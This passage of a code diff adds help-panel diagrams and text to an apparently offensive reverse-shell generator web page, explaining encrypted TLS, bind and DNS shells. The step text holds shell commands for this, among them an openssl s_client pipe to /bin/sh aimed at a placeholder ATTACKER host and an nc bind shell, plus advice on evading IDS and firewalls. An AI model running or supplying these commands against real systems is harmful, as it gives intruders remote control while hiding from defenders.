+          return `<svg viewBox="0 0 ${W} ${H}" xmlns="http://www.w3.org/2000/svg">
+            <rect width="${W}" height="${H}" fill="#030a03" rx="6"/>
+            <defs>${mkrH('en_lo','#cc9900',true)}${mkrH('en_ro','#cc9900',false)}</defs>
+            ${laptopH(ACX,'#cc9900','#1a1200','ATTACKER',':443 LISTEN')}
+            ${laptopH(VCX,'#cc9900','#1a1200','VICTIM',':random')}
+            ${lineH(RV,32, LA,32, '#cc9900','en_lo')}
+            ${lineH(LA,52, RV,52, '#cc9900','en_ro','8,4')}
+            ${lineH(RV,70, LA,70, '#cc9900','en_lo','8,4')}
+            ${badgeH(MID,32,'① TLS handshake  ·  victim → attacker','#cc9900')}
+            ${badgeH(MID,52,'② 🔒 encrypted cmd  ·  attacker → victim','#cc9900')}
+            ${badgeH(MID,70,'③ 🔒 encrypted output  ·  victim → attacker','#cc9900')}
+            ${noteH(W,H,'AES/TLS — all traffic indistinguishable from HTTPS to IDS/IPS')}
+          </svg>`;
+        },
+        steps: [
+          ['①', '<strong>Attacker</strong> starts a TLS-capable listener — e.g. <span class="gold">openssl s_server -quiet -key k.pem -cert c.pem -port 443</span> or <span class="gold">pwncat-cs -lp 443</span>'],
+          ['②', '<strong>Victim</strong> opens a TLS connection back — e.g. <span class="gold">openssl s_client -quiet -connect ATTACKER:443 | /bin/sh</span>'],
+          ['③', 'The entire session is wrapped in TLS — commands and output are <span class="gold">indistinguishable from HTTPS traffic</span> on the wire'],
+          ['④', '<span class="dim">IDS/EDR signatures that look for plaintext shell keywords (whoami, /bin/sh, …) will not trigger</span>'],
+        ],
+        note: '<span>Why encrypted?</span> Standard reverse shells send all data in plaintext — a network tap or IDS can trivially capture commands and output. Encrypted shells use TLS (or similar) so traffic looks like HTTPS. Common implementations: <strong>OpenSSL s_client/s_server</strong>, <strong>ncat --ssl</strong>, <strong>HoaxShell HTTPS</strong>, <strong>pwncat-cs</strong>.',
+      },
+      {
+        title: '◆ DNS SHELL — command & control over DNS queries',
+        svg: () => {
+          const W=620, H=175, ACX=70, VCX=550, DNX=310;
+          const LA=ACX+44, RV=VCX-44, DL=DNX-46, DR=DNX+46;
+          const MIDl = Math.round((LA+DL)/2), MIDr = Math.round((DR+RV)/2);
+          const dnsBox =
+            `<rect x="${DNX-46}" y="12" width="92" height="58" rx="4" fill="#0a0a02" stroke="#888800" stroke-width="1.5"/>` +
+            `<text x="${DNX}" y="36" text-anchor="middle" font-family="monospace" font-size="12" fill="#aaaa00">DNS</text>` +
+            `<text x="${DNX}" y="52" text-anchor="middle" font-family="monospace" font-size="9" fill="#666">nameserver</text>` +
+            `<text x="${DNX}" y="88" text-anchor="middle" font-family="monospace" font-size="8.5" fill="#444">your domain NS</text>`;
+          return `<svg viewBox="0 0 ${W} ${H}" xmlns="http://www.w3.org/2000/svg">
+            <rect width="${W}" height="${H}" fill="#030a03" rx="6"/>
+            <defs>${mkrH('dn2_lg','#00cc44',true)}${mkrH('dn2_rg','#00aa33',false)}</defs>
+            ${laptopH(ACX,'#00cc44','#001400','ATTACKER','NS record')}
+            ${laptopH(VCX,'#ff4444','#1a0000','VICTIM','DNS client')}
+            ${dnsBox}
+            ${lineH(RV,32, DR,32, '#00cc44','dn2_lg')}
+            ${lineH(DL,32, LA,32, '#00cc44','dn2_lg')}
+            ${lineH(LA,52, DL,52, '#00aa33','dn2_rg','5,4')}
+            ${lineH(DR,52, RV,52, '#00aa33','dn2_rg','5,4')}
+            <text x="${MIDr}" y="24" text-anchor="middle" font-family="monospace" font-size="8.5" fill="#44cc66">① query (XSalsa20)</text>
+            <text x="${MIDl}" y="24" text-anchor="middle" font-family="monospace" font-size="8.5" fill="#44cc66">NS forward</text>
+            <text x="${MIDl}" y="44" text-anchor="middle" font-family="monospace" font-size="8.5" fill="#33aa55">② response (cmd)</text>
+            <text x="${MIDr}" y="44" text-anchor="middle" font-family="monospace" font-size="8.5" fill="#33aa55">NS reply</text>
+            ${noteH(W,H,'Only UDP/TCP port 53 needed — DNS traffic bypasses most firewalls and proxies')}
+          </svg>`;
+        },
+        steps: [
+          ['①', '<strong>Victim</strong> sends DNS queries for subdomains of a domain you control — e.g. <span class="gold">cmd.&lt;hash&gt;.yourdomain.com</span>'],
+          ['②', 'The ISP/corporate resolver forwards the query to your <strong>authoritative nameserver</strong> (no direct TCP to attacker)'],
+          ['③', '<strong>Attacker\'s NS server</strong> (Chashell) decodes the command from the query subdomain and responds with an encoded TXT/A record'],
+          ['④', 'Victim decodes the DNS response and sends output in the next query — full shell over DNS, <strong>no direct TCP connection required</strong>'],
+        ],
+        note: '<span>Why DNS?</span> Almost every network allows outbound DNS (UDP/TCP 53). Corporate proxies, firewalls, and NAT pass DNS queries freely — the traffic blends with normal lookups. Tool: <strong>Chashell</strong> (XSalsa20-encrypted DNS C2).',
+      },
+    ],
+  },
+  bind: {
+    title: '► BIND SHELL — how it works',
+    svg: () => {
+      const W=620, H=160, ACX=80, VCX=540, LA=ACX+44, RV=VCX-44;
+      const MID = (LA+RV)/2;
+      return `<svg viewBox="0 0 ${W} ${H}" xmlns="http://www.w3.org/2000/svg">
+        <rect width="${W}" height="${H}" fill="#030a03" rx="6"/>
+        <defs>${mkrH('bd_rr','#4488ff',false)}${mkrH('bd_rc','#ff4444',false)}${mkrH('bd_lo','#ff6622',true)}</defs>
+        ${laptopH(ACX,'#4488ff','#00091a','ATTACKER','connects')}
+        ${laptopH(VCX,'#ff4444','#1a0000','VICTIM',':4444 LISTEN')}
+        ${lineH(LA,32, RV,32, '#4488ff','bd_rr')}
+        ${lineH(LA,52, RV,52, '#ff4444','bd_rc','6,4')}
+        ${lineH(RV,70, LA,70, '#ff6622','bd_lo','6,4')}
+        ${badgeH(MID,32,'① attacker connects to victim port  ·  attacker → victim','#4488ff')}
+        ${badgeH(MID,52,'② commands  ·  attacker → victim','#ff4444')}
+        ${badgeH(MID,70,'③ output  ·  victim → attacker','#ff6622')}
+        ${noteH(W,H,"Victim listens — attacker must reach victim's port directly (NAT blocks this)")}
+      </svg>`;
+    },
+    steps: [
+      ['①', '<strong>Victim</strong> executes the payload — opens a listening port (e.g. <strong>nc -lvnp 4444 -e /bin/sh</strong>)'],
+      ['②', '<strong>Attacker</strong> connects directly to the victim\'s IP and predefined port'],
+      ['③', 'Attacker sends <strong>commands</strong> through the established channel'],
+      ['④', 'Victim executes commands and sends back <strong>output</strong>'],
+    ],
+    note: '<span>Key limitation:</span> The attacker must reach the victim\'s port directly — this is blocked by inbound firewall rules and NAT. Useful in controlled lab environments or when the victim is directly reachable.',
+  },
+  dns: {
+    title: '► DNS SHELL — how it works',
+    svg: () => {
+      const W=620, H=175, ACX=70, VCX=550, DNX=310;
+      const LA=ACX+44, RV=VCX-44, DL=DNX-46, DR=DNX+46;
+      const MIDl = Math.round((LA+DL)/2), MIDr = Math.round((DR+RV)/2);
+      const dnsBox =
+        `<rect x="${DNX-46}" y="12" width="92" height="58" rx="4" fill="#0a0a02" stroke="#888800" stroke-width="1.5"/>` +
+        `<text x="${DNX}" y="36" text-anchor="middle" font-family="monospace" font-size="12" fill="#aaaa00">DNS</text>` +
+        `<text x="${DNX}" y="52" text-anchor="middle" font-family="monospace" font-size="9" fill="#666">nameserver</text>` +
+        `<text x="${DNX}" y="88" text-anchor="middle" font-family="monospace" font-size="8.5" fill="#444">your domain NS</text>`;
+      return `<svg viewBox="0 0 ${W} ${H}" xmlns="http://www.w3.org/2000/svg">
+        <rect width="${W}" height="${H}" fill="#030a03" rx="6"/>
+        <defs>${mkrH('dn_lg','#00cc44',true)}${mkrH('dn_rg','#00aa33',false)}</defs>
+        ${laptopH(ACX,'#00cc44','#001400','ATTACKER','NS record')}
+        ${laptopH(VCX,'#ff4444','#1a0000','VICTIM','DNS client')}
+        ${dnsBox}
+        ${lineH(RV,32, DR,32, '#00cc44','dn_lg')}
+        ${lineH(DL,32, LA,32, '#00cc44','dn_lg')}
+        ${lineH(LA,52, DL,52, '#00aa33','dn_rg','5,4')}
+        ${lineH(DR,52, RV,52, '#00aa33','dn_rg','5,4')}
+        <text x="${MIDr}" y="24" text-anchor="middle" font-family="monospace" font-size="8" fill="#44cc66">① query (XSalsa20)</text>
+        <text x="${MIDl}" y="24" text-anchor="middle" font-family="monospace" font-size="8" fill="#44cc66">NS forward</text>
+        <text x="${MIDl}" y="44" text-anchor="middle" font-family="monospace" font-size="8" fill="#33aa55">② response (cmd)</text>
+        <text x="${MIDr}" y="44" text-anchor="middle" font-family="monospace" font-size="8" fill="#33aa55">NS reply</text>
+        ${noteH(W,H,'Only UDP/TCP port 53 needed — DNS traffic bypasses most firewalls and proxies')}
+      </svg>`;
+    },
+    steps: [
+      ['①', '<strong>Victim</strong> sends DNS queries for subdomains of a domain you control (e.g. <strong>cmd.&lt;hash&gt;.yourdomain.com</strong>)'],
+      ['②', 'The DNS query is forwarded by the ISP/corporate resolver to your <strong>authoritative nameserver</strong>'],
+      ['③', '<strong>Attacker\'s NS server</strong> (e.g. Chashell) reads the encoded command from the query, responds with an encoded TXT/A record containing the output'],
+      ['④', 'Victim decodes the DNS response and executes the next command — shell over DNS, <strong>no direct TCP connection</strong>'],
+    ],
+    note: '<span>Why DNS?</span> Almost every network allows outbound DNS (port 53). Corporate proxies and firewalls pass DNS queries freely. The traffic blends in with normal DNS lookups. Tool: <strong>Chashell</strong> (XSalsa20-encrypted DNS tunnel).',
+  },
+  }; // end return
+})();
+
+function showHelp(type) {
+  const c = HELP_CONTENT[type];
+  if (!c) return;
+  document.getElementById('help-title').textContent = c.title;
+  document.getElementById('help-svg').outerHTML = c.svg();
+  document.getElementById('help-steps').innerHTML = c.steps.map(([n, t]) =>
+    `<div class="help-step"><span class="help-step-num">[${n}]</span><span class="help-step-text">${t}</span></div>`
+  ).join('');
+  document.getElementById('help-note').innerHTML = c.note;
+  const extra = document.getElementById('help-extra');
+  const extras = c.extras || (c.extra ? [c.extra] : []);
+  extra.innerHTML = extras.map(e =>
+    `<hr class="help-section-divider">` +
+    `<div class="help-section-title">${e.title}</div>` +
+    `<div class="help-diagram-wrap">${e.svg()}</div>` +
+    `<div class="help-steps">${e.steps.map(([n,t]) =>
+      `<div class="help-step"><span class="help-step-num">[${n}]</span><span class="help-step-text">${t}</span></div>`
+    ).join('')}</div>` +
+    `<div class="help-note">${e.note}</div>`
+  ).join('');
+  document.getElementById('help-overlay').classList.add('show');
+}
+
+function closeHelp() {
+  document.getElementById('help-overlay').classList.remove('show');
+}
+
+document.addEventListener('keydown', e => { if (e.key === 'Escape') closeHelp(); });
+
 function switchTab(name, btn) {
   document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
   document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
@@ -2052,7 +2599,10 @@ function switchTab(name, btn) {
 }
 
 // ── INIT ─────────────────────────────────────────────────────────────────────
-window.onload = render;
+window.onload = () => {
+  refreshListenerOptions(document.getElementById('shell').value);
+  render();
+};
 </script>
 </body>
 </html>
